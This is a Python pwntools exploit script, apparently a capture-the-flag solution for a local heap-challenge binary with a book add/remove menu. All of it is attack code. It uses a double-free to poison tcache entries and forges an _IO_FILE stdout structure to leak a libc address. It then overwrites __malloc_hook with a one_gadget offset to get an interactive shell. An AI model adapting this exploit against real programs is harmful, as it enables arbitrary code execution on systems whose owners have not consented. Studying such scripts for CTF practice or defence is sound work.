#!/usr/bin/env python
# coding=utf-8
from pwn import *
context.terminal=["tmux","splitw","-h"]
debug = 0
#env={"LD_PRELOAD":"./libc2.6.so"}
r=process("./pwn")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
# x/8gx 0x602020
#  p *(struct _IO_FILE_plus*)0x7ffff7bb1760
if debug:
    gdb.attach(a,'''
    b *
    ''')
def debug():
   gdb.attach(r,'''
    b *0x401227
    b *0x4012B0
    ''')
#add,
def add(name, length, content):
    r.send(str(1))
    r.recvuntil("book name:")
    r.send(name)
    r.recvuntil("description size:")
    r.send(str(length))
    r.recvuntil("description:")
    r.send(content)
    r.recvuntil(">\n")

def remove(index):
    r.sendline(str(2))
    r.recvuntil("index:")
    r.sendline(str(index))
    r.recvuntil(">\n")

r.recvuntil("username:")
r.send("admin\n\x00")
r.recvuntil("password:")
r.send("frame\n\x00")

r.recvuntil(">\n")
add("a", 0xf0, "a")#0
remove(0)
remove(0)
add("a", 0xf0, p64(0x602020))#1
add("a", 0xf0, p64(0x602020))#2
add("a", 0xf0, p8(0x60))#3
r.send(str(1))
r.recvuntil("book name:")
r.send("a")
r.recvuntil("description size:")
r.send(str(0xf0))
r.recvuntil("description:")
debug()
r.send(p64(0xfbad2887) + p64(0)+p64(0x601F70)+p64(0)+p64(0x601f70)+p64(0x601f70+8)+p64(0x601f70))#4
libc_base = u64(r.recvuntil(">\n")[:6].ljust(8, '\0')) - libc.symbols["puts"]
success("libc ==> 0x%x"%libc_base)
add("a", 0xe0, "a")#5
remove(5)
remove(5)
malloc_hook=libc_base+libc.symbols["__malloc_hook"]
add("a", 0xe0, p64(malloc_hook))#6
add("a", 0xe0, p64(malloc_hook))#7
add("a", 0xe0, p64(libc_base+0x10a38c))#8

r.send("1")

r.interactive()
